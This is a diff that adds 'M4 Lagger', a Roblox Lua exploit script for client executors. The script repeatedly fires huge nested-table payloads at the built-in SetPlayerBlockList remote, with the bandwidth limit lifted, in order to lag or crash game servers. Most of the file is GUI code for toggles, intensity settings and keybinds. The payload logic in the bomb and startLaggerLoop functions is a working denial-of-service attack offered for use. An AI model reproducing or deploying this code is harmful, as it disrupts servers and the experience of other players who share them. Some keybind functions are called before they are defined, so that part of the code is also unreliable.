@@ -1,0 +1,911 @@
+-- ============================================================
+-- M4 LAGGER | FIXED & ENHANCED
+-- ============================================================
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local TweenSvc = game:GetService("TweenService")
+local LP = Players.LocalPlayer
+
+-- ============================================================
+-- LAGGER LOGIC
+-- ============================================================
+local isMobile = UIS.TouchEnabled and not UIS.MouseEnabled
+
+local INTENSITY_CONFIG = {
+	low = isMobile and {
+		TableIncrease = 150,
+		Tries = 1,
+		LoopWaitTime = 1.2
+	} or {
+		TableIncrease = 150,
+		Tries = 1,
+		LoopWaitTime = 0.15
+	},
+	mid = isMobile and {
+		TableIncrease = 220,
+		Tries = 1,
+		LoopWaitTime = 1.0
+	} or {
+		TableIncrease = 220,
+		Tries = 1,
+		LoopWaitTime = 0.08
+	},
+	high = isMobile and {
+		TableIncrease = 290,
+		Tries = 1,
+		LoopWaitTime = 0.85
+	} or {
+		TableIncrease = 265,
+		Tries = 1,
+		LoopWaitTime = 0.05
+	},
+}
+
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+
+local function resolveRemote(path)
+	if not path or path == "" then return nil end
+	local obj = game
+	local cleaned = path:gsub("^game%.", "")
+	for segment in cleaned:gmatch("[^%.]+") do
+		if obj then
+			obj = obj[segment]
+		else
+			return nil
+		end
+	end
+	return obj
+end
+
+local function getmaxvalue(val)
+	local mainvalueifonetable = 499999
+	if type(val) ~= "number" then return nil end
+	return mainvalueifonetable / (val + 2)
+end
+
+local function bomb(tableincrease, tries)
+	local maintable = {}
+	local spammedtable = {}
+	table.insert(spammedtable, {})
+	local z = spammedtable[1]
+	for i = 1, tableincrease do
+		local tableins = {}
+		table.insert(z, tableins)
+		z = tableins
+	end
+	local maximum = getmaxvalue(tableincrease) or 9999999
+	for i = 1, maximum do
+		table.insert(maintable, spammedtable)
+		if i % 5000 == 0 then task.wait() end
+	end
+	local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+	if remote then
+		for i = 1, tries do
+			pcall(function()
+				if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+					remote:FireServer(maintable)
+				elseif remote:IsA("RemoteFunction") then
+					remote:InvokeServer(maintable)
+				end
+			end)
+		end
+	end
+end
+
+local laggerEnabled = false
+local laggerThread  = nil
+local currentConfig = INTENSITY_CONFIG["high"]
+
+local function startLaggerLoop()
+	while laggerEnabled do
+		pcall(function()
+			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+		end)
+		task.spawn(function()
+			bomb(currentConfig.TableIncrease, currentConfig.Tries)
+		end)
+		task.wait(math.max(currentConfig.LoopWaitTime, 0.05))
+	end
+end
+
+local function stopLaggerLoop()
+	laggerEnabled = false
+	if laggerThread then
+		pcall(function() coroutine.close(laggerThread) end)
+		laggerThread = nil
+	end
+end
+
+local function startLagger()
+	if laggerThread then return end
+	laggerEnabled = true
+	laggerThread  = coroutine.create(startLaggerLoop)
+	coroutine.resume(laggerThread)
+end
+
+local function restartLagger()
+	stopLaggerLoop()
+	startLagger()
+end
+
+-- ============================================================
+-- STATE
+-- ============================================================
+local State = {
+	laggerOn     = false,
+	intensity    = "high",
+	lockGui      = false,
+	settingsOpen = false,
+}
+
+-- Store binds as tables with type and value
+local function createBind()
+	return {
+		type = "keyboard", -- or "gamepad"
+		value = Enum.KeyCode.Unknown,
+		display = "none"
+	}
+end
+
+local Binds = {
+	low = createBind(),
+	mid = createBind(),
+	high = createBind(),
+	toggle = createBind(),
+}
+
+-- ============================================================
+-- DESTROY OLD GUIs
+-- ============================================================
+for _, name in pairs({"EboxLagger", "EboxLaggerGui", "MonkeyLagger"}) do
+	pcall(function() game:GetService("CoreGui"):FindFirstChild(name):Destroy() end)
+	pcall(function() LP.PlayerGui:FindFirstChild(name):Destroy() end)
+end
+
+-- ============================================================
+-- GUI ROOT
+-- ============================================================
+local gui = Instance.new("ScreenGui")
+gui.Name           = "M4Lagger"
+gui.ResetOnSpawn   = false
+gui.DisplayOrder   = 999
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
+pcall(function() gui.Parent = game:GetService("CoreGui") end)
+if not gui.Parent then gui.Parent = LP.PlayerGui end
+
+-- ============================================================
+-- COLORS
+-- ============================================================
+local C = {
+	bg        = Color3.fromRGB(10, 10, 12),
+	header    = Color3.fromRGB(18, 18, 22),
+	border    = Color3.fromRGB(45, 45, 55),
+	text      = Color3.fromRGB(235, 235, 240),
+	textSub   = Color3.fromRGB(160, 160, 175),
+	textDim   = Color3.fromRGB(110, 110, 125),
+	pillOff   = Color3.fromRGB(50, 50, 60),
+	pillOn    = Color3.fromRGB(140, 140, 160),
+	knobCol   = Color3.fromRGB(240, 240, 245),
+	btnActive = Color3.fromRGB(200, 200, 215),
+	btnIdle   = Color3.fromRGB(35, 35, 42),
+	btnBorder = Color3.fromRGB(55, 55, 65),
+	bindBg    = Color3.fromRGB(28, 28, 35),
+	bindText  = Color3.fromRGB(190, 190, 205),
+	divider   = Color3.fromRGB(40, 40, 50),
+}
+
+-- ============================================================
+-- HELPERS
+-- ============================================================
+
+local function addBackground(parent)
+	local img = Instance.new("ImageLabel")
+	img.Name = "BG"
+	img.Parent = parent
+	img.Size = UDim2.new(1,0,1,0)
+	img.Position = UDim2.new(0,0,0,0)
+	img.BackgroundTransparency = 1
+	img.Image = "rbxassetid://140512999752454"
+	img.ImageTransparency = 0.3
+	img.ScaleType = Enum.ScaleType.Crop
+	img.ZIndex = 1
+
+	local corner = Instance.new("UICorner", img)
+	corner.CornerRadius = UDim.new(0,10)
+end
+ 
+local function mkCorner(p, r)
+	local c = Instance.new("UICorner", p)
+	c.CornerRadius = UDim.new(0, r or 8)
+	return c
+end
+
+local function mkStroke(p, col, th)
+	local s = Instance.new("UIStroke", p)
+	s.Color           = col or C.border
+	s.Thickness       = th or 1
+	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	return s
+end
+
+local function mkPad(p, l, r, t, b)
+	local pad = Instance.new("UIPadding", p)
+	pad.PaddingLeft   = UDim.new(0, l or 0)
+	pad.PaddingRight  = UDim.new(0, r or 0)
+	pad.PaddingTop    = UDim.new(0, t or 0)
+	pad.PaddingBottom = UDim.new(0, b or 0)
+end
+
+-- ============================================================
+-- DRAGGABLE
+-- ============================================================
+local function makeDraggable(frame, handle)
+	local src = handle or frame
+	local dragging, dragStart, startPos = false, nil, nil
+	local dragInput = nil
+
+	src.InputBegan:Connect(function(inp)
+		if State.lockGui then return end
+		if inp.UserInputType == Enum.UserInputType.MouseButton1
+			or inp.UserInputType == Enum.UserInputType.Touch then
+			dragging  = true
+			dragStart = inp.Position
+			startPos  = frame.Position
+			inp.Changed:Connect(function()
+				if inp.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	src.InputChanged:Connect(function(inp)
+		if inp.UserInputType == Enum.UserInputType.MouseMovement
+			or inp.UserInputType == Enum.UserInputType.Touch then
+			dragInput = inp
+		end
+	end)
+
+	UIS.InputChanged:Connect(function(inp)
+		if inp == dragInput and dragging and not State.lockGui then
+			local d = inp.Position - dragStart
+			frame.Position = UDim2.new(
+				startPos.X.Scale, startPos.X.Offset + d.X,
+				startPos.Y.Scale, startPos.Y.Offset + d.Y
+			)
+		end
+	end)
+end
+
+-- ============================================================
+-- TOGGLE PILL
+-- ============================================================
+local function makeTogglePill(parent, isOn)
+	local pill = Instance.new("Frame", parent)
+	pill.Size             = UDim2.new(0, 46, 0, 24)
+	pill.BackgroundColor3 = isOn and C.pillOn or C.pillOff
+	pill.BorderSizePixel  = 0
+	pill.ClipsDescendants = false
+	mkCorner(pill, 12)
+
+	local knob = Instance.new("Frame", pill)
+	knob.Size             = UDim2.new(0, 18, 0, 18)
+	knob.Position         = isOn
+		and UDim2.new(1, -20, 0.5, -9)
+		or  UDim2.new(0,   2, 0.5, -9)
+	knob.BackgroundColor3 = C.knobCol
+	knob.BorderSizePixel  = 0
+	knob.ZIndex           = 10
+	mkCorner(knob, 9)
+
+	local function setVal(on)
+		TweenSvc:Create(pill, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
+			BackgroundColor3 = on and C.pillOn or C.pillOff,
+		}):Play()
+		TweenSvc:Create(knob, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
+			Position = on
+				and UDim2.new(1, -20, 0.5, -9)
+				or  UDim2.new(0,   2, 0.5, -9),
+		}):Play()
+	end
+
+	return pill, knob, setVal
+end
+
+-- ============================================================
+-- KEYBIND NAME HELPER - FULL CONTROLLER SUPPORT
+-- ============================================================
+local function getKeyName(bind)
+	if not bind or bind.value == Enum.KeyCode.Unknown then 
+		return "none" 
+	end
+	
+	if bind.type == "keyboard" then
+		local n = bind.value.Name
+		if n == "Unknown" then return "none" end
+		if n == "LeftControl" then return "ctrl" end
+		if n == "LeftShift" then return "shift" end
+		if n == "Space" then return "space" end
+		return n:lower()
+	elseif bind.type == "gamepad" then
+		local n = bind.value.Name
+		-- Standard gamepad buttons
+		if n == "Gamepad1" then return "a" end
+		if n == "Gamepad2" then return "b" end
+		if n == "Gamepad3" then return "x" end
+		if n == "Gamepad4" then return "y" end
+		if n == "GamepadLeftShoulder" then return "lb" end
+		if n == "GamepadRightShoulder" then return "rb" end
+		if n == "GamepadLeftTrigger" then return "lt" end
+		if n == "GamepadRightTrigger" then return "rt" end
+		if n == "GamepadDpadDown" then return "d-down" end
+		if n == "GamepadDpadUp" then return "d-up" end
+		if n == "GamepadDpadLeft" then return "d-left" end
+		if n == "GamepadDpadRight" then return "d-right" end
+		if n == "GamepadButton1" then return "btn1" end
+		if n == "GamepadButton2" then return "btn2" end
+		if n == "GamepadButton3" then return "btn3" end
+		if n == "GamepadButton4" then return "btn4" end
+		if n == "GamepadButton5" then return "btn5" end
+		if n == "GamepadButton6" then return "btn6" end
+		if n == "GamepadButton7" then return "btn7" end
+		if n == "GamepadButton8" then return "btn8" end
+		if n == "GamepadButton9" then return "btn9" end
+		if n == "GamepadButton10" then return "btn10" end
+		if n == "GamepadButton11" then return "btn11" end
+		if n == "GamepadButton12" then return "btn12" end
+		if n == "GamepadButton13" then return "btn13" end
+		if n == "GamepadButton14" then return "btn14" end
+		if n == "GamepadButton15" then return "btn15" end
+		if n == "GamepadButton16" then return "btn16" end
+		if n == "GamepadLeftThumbstick" then return "ls" end
+		if n == "GamepadRightThumbstick" then return "rs" end
+		if n == "GamepadSelect" then return "select" end
+		if n == "GamepadStart" then return "start" end
+		if n == "GamepadMenu" then return "menu" end
+		if n == "GamepadView" then return "view" end
+		return n:lower()
+	end
+	
+	return "none"
+end
+
+-- ============================================================
+-- PANEL DIMENSIONS
+-- ============================================================
+local PW    = 260
+local TOP_H = 155
+
+-- ============================================================
+-- TOP PANEL
+-- ============================================================
+local topPanel = Instance.new("Frame", gui)
+addBackground(topPanel)
+topPanel.Name             = "TopPanel"
+topPanel.Size             = UDim2.new(0, PW, 0, TOP_H)
+topPanel.Position         = UDim2.new(0, 430, 0, 330)
+topPanel.BackgroundColor3 = C.bg
+topPanel.BorderSizePixel  = 0
+mkCorner(topPanel, 10)
+mkStroke(topPanel, C.border, 1)
+makeDraggable(topPanel)
+
+-- Header
+local topHeader = Instance.new("Frame", topPanel)
+topHeader.Size             = UDim2.new(1, 0, 0, 38)
+topHeader.BackgroundColor3 = C.header
+topHeader.BorderSizePixel  = 0
+mkCorner(topHeader, 10)
+
+local hdrFix = Instance.new("Frame", topHeader)
+hdrFix.Size             = UDim2.new(1, 0, 0.5, 0)
+hdrFix.Position         = UDim2.new(0, 0, 0.5, 0)
+hdrFix.BackgroundColor3 = C.header
+hdrFix.BorderSizePixel  = 0
+
+local titleLbl = Instance.new("TextLabel", topHeader)
+titleLbl.Size               = UDim2.new(1, -90, 1, 0)
+titleLbl.Position           = UDim2.new(0, 14, 0, 0)
+titleLbl.BackgroundTransparency = 1
+titleLbl.Text               = "M4 LAGGER"
+titleLbl.TextColor3         = C.text
+titleLbl.Font               = Enum.Font.GothamBold
+titleLbl.TextSize           = 14
+titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
+titleLbl.ZIndex             = 2
+
+local statusLbl = Instance.new("TextLabel", topHeader)
+statusLbl.Size               = UDim2.new(0, 30, 1, 0)
+statusLbl.Position           = UDim2.new(1, -60, 0, 0)
+statusLbl.BackgroundTransparency = 1
+statusLbl.Text               = "OFF"
+statusLbl.TextColor3         = C.textDim
+statusLbl.Font               = Enum.Font.GothamBold
+statusLbl.TextSize           = 11
+statusLbl.TextXAlignment     = Enum.TextXAlignment.Right
+statusLbl.ZIndex             = 2
+
+local gearBtn = Instance.new("TextButton", topHeader)
+gearBtn.Size               = UDim2.new(0, 24, 0, 24)
+gearBtn.Position           = UDim2.new(1, -34, 0.5, -12)
+gearBtn.BackgroundTransparency = 1
+gearBtn.Text               = "⚙"
+gearBtn.TextColor3         = C.textSub
+gearBtn.Font               = Enum.Font.GothamBold
+gearBtn.TextSize           = 16
+gearBtn.ZIndex             = 3
+gearBtn.BorderSizePixel    = 0
+
+-- Body
+local topBody = Instance.new("Frame", topPanel)
+topBody.Size                = UDim2.new(1, 0, 1, -38)
+topBody.Position            = UDim2.new(0, 0, 0, 38)
+topBody.BackgroundTransparency = 1
+topBody.ClipsDescendants    = false
+
+-- Lagger toggle
+local lagRow = Instance.new("Frame", topBody)
+lagRow.Size                = UDim2.new(1, 0, 0, 42)
+lagRow.Position            = UDim2.new(0, 0, 0, 2)
+lagRow.BackgroundTransparency = 1
+lagRow.ClipsDescendants    = false
+
+local lagLbl = Instance.new("TextLabel", lagRow)
+lagLbl.Size               = UDim2.new(1, -70, 1, 0)
+lagLbl.Position           = UDim2.new(0, 14, 0, 0)
+lagLbl.BackgroundTransparency = 1
+lagLbl.Text               = "LAGGER"
+lagLbl.TextColor3         = C.text
+lagLbl.Font               = Enum.Font.GothamBold
+lagLbl.TextSize           = 14
+lagLbl.TextXAlignment     = Enum.TextXAlignment.Left
+lagLbl.ZIndex             = 3
+
+local lagPill, lagKnob, setLagPill = makeTogglePill(lagRow, false)
+lagPill.Position = UDim2.new(1, -60, 0.5, -12)
+lagPill.ZIndex   = 4
+
+local lagClickBtn = Instance.new("TextButton", lagRow)
+lagClickBtn.Size               = UDim2.new(1, 0, 1, 0)
+lagClickBtn.BackgroundTransparency = 1
+lagClickBtn.Text               = ""
+lagClickBtn.ZIndex             = 5
+lagClickBtn.BorderSizePixel    = 0
+
+-- Divider
+local div1 = Instance.new("Frame", topBody)
+div1.Size             = UDim2.new(1, -28, 0, 1)
+div1.Position         = UDim2.new(0, 14, 0, 46)
+div1.BackgroundColor3 = C.divider
+div1.BorderSizePixel  = 0
+
+-- Intensity label
+local intensityLbl = Instance.new("TextLabel", topBody)
+intensityLbl.Size               = UDim2.new(1, -28, 0, 20)
+intensityLbl.Position           = UDim2.new(0, 14, 0, 52)
+intensityLbl.BackgroundTransparency = 1
+intensityLbl.Text               = "INTENSITY"
+intensityLbl.TextColor3         = C.textSub
+intensityLbl.Font               = Enum.Font.Gotham
+intensityLbl.TextSize           = 11
+intensityLbl.TextXAlignment     = Enum.TextXAlignment.Left
+intensityLbl.ZIndex             = 3
+
+-- Intensity buttons
+local intensityRow = Instance.new("Frame", topBody)
+intensityRow.Size               = UDim2.new(1, -28, 0, 32)
+intensityRow.Position           = UDim2.new(0, 14, 0, 75)
+intensityRow.BackgroundTransparency = 1
+
+local intLayout = Instance.new("UIListLayout", intensityRow)
+intLayout.FillDirection = Enum.FillDirection.Horizontal
+intLayout.SortOrder     = Enum.SortOrder.LayoutOrder
+intLayout.Padding       = UDim.new(0, 4)
+
+local intensityBtns  = {}
+local intensityNames = {"LOW", "MID", "HIGH"}
+local btnW = math.floor((PW - 28 - 8) / 3)
+
+for i, name in ipairs(intensityNames) do
+	local btn = Instance.new("TextButton", intensityRow)
+	btn.Size             = UDim2.new(0, btnW, 1, 0)
+	btn.BackgroundColor3 = (name == State.intensity:upper()) and C.btnActive or C.btnIdle
+	btn.BorderSizePixel  = 0
+	btn.Text             = name
+	btn.TextColor3       = (name == State.intensity:upper()) and C.bg or C.textSub
+	btn.Font             = Enum.Font.GothamBold
+	btn.TextSize         = 11
+	btn.ZIndex           = 3
+	btn.LayoutOrder      = i
+	mkCorner(btn, 6)
+	mkStroke(btn, C.btnBorder, 1)
+	intensityBtns[name] = btn
+end
+
+-- ============================================================
+-- SETTINGS PANEL
+-- ============================================================
+local settingsPanel = Instance.new("Frame", gui)
+addBackground(settingsPanel)
+settingsPanel.Name             = "SettingsPanel"
+settingsPanel.Size             = UDim2.new(0, PW, 0, 230)
+settingsPanel.Position         = UDim2.new(
+	topPanel.Position.X.Scale,
+	topPanel.Position.X.Offset,
+	topPanel.Position.Y.Scale,
+	topPanel.Position.Y.Offset + TOP_H + 8
+)
+settingsPanel.BackgroundColor3 = C.bg
+settingsPanel.BorderSizePixel  = 0
+settingsPanel.Visible          = false
+mkCorner(settingsPanel, 10)
+mkStroke(settingsPanel, C.border, 1)
+makeDraggable(settingsPanel)
+
+topPanel:GetPropertyChangedSignal("Position"):Connect(function()
+	settingsPanel.Position = UDim2.new(
+		topPanel.Position.X.Scale,
+		topPanel.Position.X.Offset,
+		topPanel.Position.Y.Scale,
+		topPanel.Position.Y.Offset + TOP_H + 8
+	)
+end)
+
+local settBody = Instance.new("Frame", settingsPanel)
+settBody.Size                = UDim2.new(1, 0, 1, 0)
+settBody.BackgroundTransparency = 1
+mkPad(settBody, 14, 14, 10, 10)
+
+local settList = Instance.new("UIListLayout", settBody)
+settList.SortOrder = Enum.SortOrder.LayoutOrder
+settList.Padding   = UDim.new(0, 0)
+
+local function makeSettRow(parent, labelText, lo)
+	local row = Instance.new("Frame", parent)
+	row.Size                = UDim2.new(1, 0, 0, 40)
+	row.BackgroundTransparency = 1
+	row.BorderSizePixel     = 0
+	row.LayoutOrder         = lo
+	row.ClipsDescendants    = false
+
+	local lbl = Instance.new("TextLabel", row)
+	lbl.Size               = UDim2.new(0.55, 0, 1, 0)
+	lbl.BackgroundTransparency = 1
+	lbl.Text               = labelText
+	lbl.TextColor3         = C.textSub
+	lbl.Font               = Enum.Font.Gotham
+	lbl.TextSize           = 13
+	lbl.TextXAlignment     = Enum.TextXAlignment.Left
+	return row, lbl
+end
+
+-- Lock GUI
+local lockRow, _ = makeSettRow(settBody, "LOCK GUI", 1)
+local lockPill, lockKnob, setLockPill = makeTogglePill(lockRow, false)
+lockPill.Position = UDim2.new(1, -46, 0.5, -12)
+lockPill.ZIndex   = 4
+
+local lockClickBtn = Instance.new("TextButton", lockRow)
+lockClickBtn.Size               = UDim2.new(1, 0, 1, 0)
+lockClickBtn.BackgroundTransparency = 1
+lockClickBtn.Text               = ""
+lockClickBtn.ZIndex             = 5
+lockClickBtn.BorderSizePixel    = 0
+
+-- Divider 1
+local div2 = Instance.new("Frame", settBody)
+div2.Size             = UDim2.new(1, 0, 0, 1)
+div2.BackgroundColor3 = C.divider
+div2.BorderSizePixel  = 0
+div2.LayoutOrder      = 2
+
+-- LAGGER TOGGLE KEYBIND ROW
+local toggleKeyRow, toggleKeyLbl = makeSettRow(settBody, "LAGGER KEYBIND", 3)
+
+local toggleBindBtn = Instance.new("TextButton", toggleKeyRow)
+toggleBindBtn.Size             = UDim2.new(0, 60, 0, 26)
+toggleBindBtn.Position         = UDim2.new(1, -60, 0.5, -13)
+toggleBindBtn.BackgroundColor3 = C.bindBg
+toggleBindBtn.BorderSizePixel  = 0
+toggleBindBtn.Text             = getKeyName(Binds.toggle)
+toggleBindBtn.TextColor3       = C.bindText
+toggleBindBtn.Font             = Enum.Font.GothamBold
+toggleBindBtn.TextSize         = 11
+toggleBindBtn.ZIndex           = 3
+mkCorner(toggleBindBtn, 5)
+mkStroke(toggleBindBtn, C.border, 1)
+
+local listeningToggle = false
+local lkConnToggle   = nil
+
+local function stopListenToggle(inputType, inputValue)
+	listeningToggle          = false
+	if lkConnToggle then lkConnToggle:Disconnect(); lkConnToggle = nil end
+	toggleBindBtn.TextColor3 = C.bindText
+	
+	if inputType and inputValue then
+		Binds.toggle.type = inputType
+		Binds.toggle.value = inputValue
+		toggleBindBtn.Text = getKeyName(Binds.toggle)
+	else
+		Binds.toggle.type = "keyboard"
+		Binds.toggle.value = Enum.KeyCode.Unknown
+		toggleBindBtn.Text = "none"
+	end
+end
+
+toggleBindBtn.MouseButton1Click:Connect(function()
+	if listeningToggle then stopListenToggle(nil, nil); return end
+	listeningToggle          = true
+	toggleBindBtn.Text       = "..."
+	toggleBindBtn.TextColor3 = C.text
+	lkConnToggle = UIS.InputBegan:Connect(function(inp, gp)
+		if gp or not listeningToggle then return end
+		
+		-- Keyboard input
+		if inp.UserInputType == Enum.UserInputType.Keyboard then
+			if inp.KeyCode == Enum.KeyCode.Escape then 
+				stopListenToggle(nil, nil)
+				return 
+			end
+			stopListenToggle("keyboard", inp.KeyCode)
+		end
+		
+		-- Gamepad input - detect specific button presses
+		if inp.UserInputType == Enum.UserInputType.Gamepad1 or 
+		   inp.UserInputType == Enum.UserInputType.Gamepad2 or
+		   inp.UserInputType == Enum.UserInputType.Gamepad3 or
+		   inp.UserInputType == Enum.UserInputType.Gamepad4 then
+			stopListenToggle("gamepad", inp.UserInputType)
+		end
+	end)
+end)
+
+toggleBindBtn.MouseButton2Click:Connect(function()
+	listeningToggle      = false
+	if lkConnToggle then lkConnToggle:Disconnect(); lkConnToggle = nil end
+	Binds.toggle.type = "keyboard"
+	Binds.toggle.value = Enum.KeyCode.Unknown
+	toggleBindBtn.Text = "none"
+	toggleBindBtn.TextColor3 = C.bindText
+end)
+
+-- Divider 2
+local div3 = Instance.new("Frame", settBody)
+div3.Size             = UDim2.new(1, 0, 0, 1)
+div3.BackgroundColor3 = C.divider
+div3.BorderSizePixel  = 0
+div3.LayoutOrder      = 4
+
+-- Intensity keybind rows
+local bindRows = {}
+
+local function makeBindRow(labelText, bindKey, lo)
+	local row, _ = makeSettRow(settBody, labelText, lo)
+
+	local bindBtn = Instance.new("TextButton", row)
+	bindBtn.Size             = UDim2.new(0, 60, 0, 26)
+	bindBtn.Position         = UDim2.new(1, -60, 0.5, -13)
+	bindBtn.BackgroundColor3 = C.bindBg
+	bindBtn.BorderSizePixel  = 0
+	bindBtn.Text             = getKeyName(Binds[bindKey])
+	bindBtn.TextColor3       = C.bindText
+	bindBtn.Font             = Enum.Font.GothamBold
+	bindBtn.TextSize         = 11
+	bindBtn.ZIndex           = 3
+	mkCorner(bindBtn, 5)
+	mkStroke(bindBtn, C.border, 1)
+
+	local listening = false
+	local lkConn   = nil
+
+	local function stopListen(inputType, inputValue)
+		listening          = false
+		if lkConn then lkConn:Disconnect(); lkConn = nil end
+		bindBtn.TextColor3 = C.bindText
+		
+		if inputType and inputValue then
+			Binds[bindKey].type = inputType
+			Binds[bindKey].value = inputValue
+			bindBtn.Text = getKeyName(Binds[bindKey])
+		else
+			Binds[bindKey].type = "keyboard"
+			Binds[bindKey].value = Enum.KeyCode.Unknown
+			bindBtn.Text = "none"
+		end
+	end
+
+	bindBtn.MouseButton1Click:Connect(function()
+		if listening then stopListen(nil, nil); return end
+		listening          = true
+		bindBtn.Text       = "..."
+		bindBtn.TextColor3 = C.text
+		lkConn = UIS.InputBegan:Connect(function(inp, gp)
+			if gp or not listening then return end
+			
+			-- Keyboard input
+			if inp.UserInputType == Enum.UserInputType.Keyboard then
+				if inp.KeyCode == Enum.KeyCode.Escape then 
+					stopListen(nil, nil)
+					return 
+				end
+				stopListen("keyboard", inp.KeyCode)
+			end
+			
+			-- Gamepad input - detect specific button presses
+			if inp.UserInputType == Enum.UserInputType.Gamepad1 or 
+			   inp.UserInputType == Enum.UserInputType.Gamepad2 or
+			   inp.UserInputType == Enum.UserInputType.Gamepad3 or
+			   inp.UserInputType == Enum.UserInputType.Gamepad4 then
+				stopListen("gamepad", inp.UserInputType)
+			end
+		end)
+	end)
+
+	bindBtn.MouseButton2Click:Connect(function()
+		listening      = false
+		if lkConn then lkConn:Disconnect(); lkConn = nil end
+		Binds[bindKey].type = "keyboard"
+		Binds[bindKey].value = Enum.KeyCode.Unknown
+		bindBtn.Text = "none"
+		bindBtn.TextColor3 = C.bindText
+	end)
+
+	bindRows[bindKey] = bindBtn
+	return row
+end
+
+makeBindRow("LOW KEYBIND",  "low",  5)
+makeBindRow("MID KEYBIND",  "mid",  6)
+makeBindRow("HIGH KEYBIND", "high", 7)
+
+-- ============================================================
+-- KEYBIND TOGGLE FUNCTION
+-- ============================================================
+local function toggleLaggerWithKey(intensityName)
+	if State.laggerOn then
+		setLaggerState(false)
+	else
+		setIntensity(intensityName:lower())
+		setLaggerState(true)
+	end
+end
+
+-- ============================================================
+-- LOGIC: STATUS
+-- ============================================================
+local function updateStatus()
+	if State.laggerOn then
+		statusLbl.Text       = "ON"
+		statusLbl.TextColor3 = Color3.fromRGB(120, 220, 120)
+	else
+		statusLbl.Text       = "OFF"
+		statusLbl.TextColor3 = C.textDim
+	end
+end
+
+-- ============================================================
+-- LOGIC: SET INTENSITY
+-- ============================================================
+local function setIntensity(name)
+	State.intensity = name
+	currentConfig   = INTENSITY_CONFIG[name]
+
+	for n, btn in pairs(intensityBtns) do
+		local btnName = n:lower()
+		if btnName == name then
+			btn.BackgroundColor3 = C.btnActive
+			btn.TextColor3       = C.bg
+		else
+			btn.BackgroundColor3 = C.btnIdle
+			btn.TextColor3       = C.textSub
+		end
+	end
+
+	if State.laggerOn then
+		restartLagger()
+	end
+end
+
+-- ============================================================
+-- LOGIC: TOGGLE LAGGER
+-- ============================================================
+local function setLaggerState(on)
+	State.laggerOn = on
+	setLagPill(on)
+	updateStatus()
+	if on then
+		currentConfig = INTENSITY_CONFIG[State.intensity]
+		startLagger()
+	else
+		stopLaggerLoop()
+	end
+end
+
+lagClickBtn.MouseButton1Click:Connect(function()
+	setLaggerState(not State.laggerOn)
+end)
+
+for name, btn in pairs(intensityBtns) do
+	btn.MouseButton1Click:Connect(function()
+		setIntensity(name:lower())
+	end)
+end
+
+-- ============================================================
+-- LOGIC: LOCK GUI
+-- ============================================================
+lockClickBtn.MouseButton1Click:Connect(function()
+	State.lockGui = not State.lockGui
+	setLockPill(State.lockGui)
+end)
+
+-- ============================================================
+-- LOGIC: GEAR
+-- ============================================================
+gearBtn.MouseButton1Click:Connect(function()
+	State.settingsOpen    = not State.settingsOpen
+	settingsPanel.Visible = State.settingsOpen
+	gearBtn.TextColor3    = State.settingsOpen and C.text or C.textSub
+end)
+
+-- ============================================================
+-- LOGIC: KEYBIND HOTKEYS (Supports both keyboard and controller)
+-- ============================================================
+UIS.InputBegan:Connect(function(inp, gp)
+	if gp then return end
+	
+	-- Check for keyboard inputs
+	if inp.UserInputType == Enum.UserInputType.Keyboard then
+		local kc = inp.KeyCode
+		
+		-- Check main toggle keybind first
+		if Binds.toggle.type == "keyboard" and Binds.toggle.value ~= Enum.KeyCode.Unknown and kc == Binds.toggle.value then
+			setLaggerState(not State.laggerOn)
+			return
+		end
+		
+		-- Check intensity keybinds
+		for bindName, bind in pairs(Binds) do
+			if bindName ~= "toggle" and bind.type == "keyboard" and bind.value ~= Enum.KeyCode.Unknown and kc == bind.value then
+				toggleLaggerWithKey(bindName)
+			end
+		end
+	end
+	
+	-- Check for gamepad inputs
+	if inp.UserInputType == Enum.UserInputType.Gamepad1 or 
+	   inp.UserInputType == Enum.UserInputType.Gamepad2 or
+	   inp.UserInputType == Enum.UserInputType.Gamepad3 or
+	   inp.UserInputType == Enum.UserInputType.Gamepad4 then
+		
+		local inputType = inp.UserInputType
+		
+		-- Check main toggle keybind first
+		if Binds.toggle.type == "gamepad" and Binds.toggle.value ~= Enum.KeyCode.Unknown and inputType == Binds.toggle.value then
+			setLaggerState(not State.laggerOn)
+			return
+		end
+		
+		-- Check intensity keybinds
+		for bindName, bind in pairs(Binds) do
+			if bindName ~= "toggle" and bind.type == "gamepad" and bind.value ~= Enum.KeyCode.Unknown and inputType == bind.value then
+				toggleLaggerWithKey(bindName)
+			end
+		end
+	end
+end)
+
+-- ============================================================
+-- STARTUP
+-- ============================================================
+updateStatus()
+setIntensity(State.intensity)
+
+print("[M4 Lagger] Loaded successfully!")
+print("[M4 Lagger] Supports both keyboard and controller binds!")
+print("[M4 Lagger] Click any keybind box and press a keyboard key OR a controller button!")
